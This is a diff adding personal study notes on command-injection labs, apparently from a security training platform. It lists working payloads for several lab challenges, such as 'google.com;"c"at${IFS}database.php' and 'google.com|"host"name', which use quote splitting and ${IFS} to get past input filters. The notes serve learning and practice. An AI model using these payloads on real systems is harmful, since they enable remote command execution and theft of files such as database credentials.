@@ -294,3 +294,52 @@ Commix (Command Injection Exploiter) is an automated tool used for detecting and
 
 *request method* ->
 : python commix.py --url="http://example.com/index.php" --method=POST
+
+* exam machine
+
+First payload that works
+: google.com;'l's
+
+*actual directory* ->
+#+begin_src sh<code>assets</code><br><code>database.php</code><br><code>index.php</code>
+#+end_src
+
+*get the content of the database.php file payload* ->
+: google.com;"c"at${IFS}database.php
+
+* exam 2
+This lab contains a Command Injection vulnerability that leads to remote command execution.
+
+The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. Find a way to run a command on the system.
+
+What is the hostname address of the server where the website is running?
+
+payload that works ->
+: google.com;"ho"stname
+
+* command injection improved filter bypass challenge
+This lab contains a Command Injection vulnerability that leads to remote command execution.
+
+The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains commands or operators, your query will be blocked. You should know that almost all commands are ignored. Find a way to run a command on the system.
+
+What is the hostname address of the server where the website is running?
+
+*payload* ->
+: google.com|"host"name
+
+* command injection in perl-based stock control system
+This lab contains a Command Injection vulnerability that leads to remote command execution.
+
+The web application checks stock for products with a script written in Perl. Find a way to run commands on the system.
+
+What is the hostname address of the server where the website is running?
+
+*payload* ->
+: fujifilm-x-t200|hostname
+
+* command injection via user-agent log entries
+This lab contains a Command Injection vulnerability that leads to remote command execution.
+
+The web application logs the User Agent information of visiting users in a log file. Find a way to execute commands on the system.
+
+What is the hostname address of the server where the website is running?
